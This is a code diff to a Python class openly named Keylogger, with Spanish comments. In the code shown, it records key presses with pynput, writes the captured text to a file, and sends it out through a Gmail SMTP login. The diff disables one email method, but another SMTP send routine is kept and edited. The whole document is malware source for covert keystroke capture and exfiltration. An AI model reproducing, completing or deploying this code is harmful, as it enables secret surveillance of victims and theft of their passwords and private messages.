@@ -45,20 +45,25 @@ class Keylogger:
 
     #Crea el txt con los datos capturados
     def crearTXT(self,captexto):
-        archivo = open(self.m,"w+")
-        archivo.write(captexto)
+        archivo = open(self.m,"w")
+        archivo.write(captexto+'\n')
         archivo.close()
         contador.ContarTxt(self.m)
+        archivo = open("temp.txt","r")
+        cadenita=str(archivo.read())
+        archivo.close()
+        archivo = open(self.m,"a")
+        archivo.write(cadenita)
         archivo.close()
 
     #envía el email
-    def send_mail(self, email, password, message):
+    '''def send_mail(self, email, password, message):
         server = smtplib.SMTP("smtp.gmail.com", 587)
         server.starttls()
         server.login(email, password)
         server.sendmail(email, email, message)
         server.quit()
-    
+    '''
     #inicia el proceso
     def start(self):
         keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
@@ -79,5 +84,6 @@ class Keylogger:
         smtp = smtplib.SMTP("smtp.gmail.com", 587)
         smtp.starttls()
         smtp.login(email, password)
+        
         smtp.sendmail(email, email, mensaje.as_string())
         smtp.quit()
